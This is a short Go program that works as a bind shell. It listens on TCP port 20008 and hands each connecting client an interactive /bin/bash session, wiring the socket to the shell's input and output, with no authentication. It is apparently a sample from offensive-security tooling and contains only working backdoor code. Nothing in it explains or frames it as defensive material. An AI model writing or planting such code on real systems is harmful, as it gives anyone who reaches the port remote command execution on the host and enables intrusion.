package main

import (
	"io"
	"log"
	"net"
	"os/exec"
)

func handle(conn net.Conn) {
	defer conn.Close()
	cmd := exec.Command("/bin/bash", "-i")
	// 创建管道
	rp, wp := io.Pipe()
	cmd.Stdin = conn
	cmd.Stdout = wp
	go func() {
		if _, err := io.Copy(conn, rp); err != nil {
			log.Fatalln(err)
		}
	}()
	cmd.Run()
}

func main() {
	listener, err := net.Listen("tcp", ":20008")
	if err != nil {
		log.Fatalln("Unable to bind to port")
	}
	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Fatalln(err)
			break
		}
		go handle(conn)
	}
}
